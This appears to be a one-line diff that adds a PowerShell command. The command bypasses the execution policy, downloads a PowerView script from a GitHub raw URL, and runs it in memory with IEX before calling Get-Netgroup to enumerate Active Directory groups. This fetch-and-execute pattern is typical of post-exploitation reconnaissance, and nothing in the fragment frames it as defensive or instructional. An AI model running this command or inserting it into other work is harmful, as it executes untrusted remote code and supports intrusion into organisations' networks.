@@ -1,0 +1,1 @@
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/CyberSecurity2045/Security-Tools/main/Powerview-2023-05-12.ps1');Get-Netgroup"
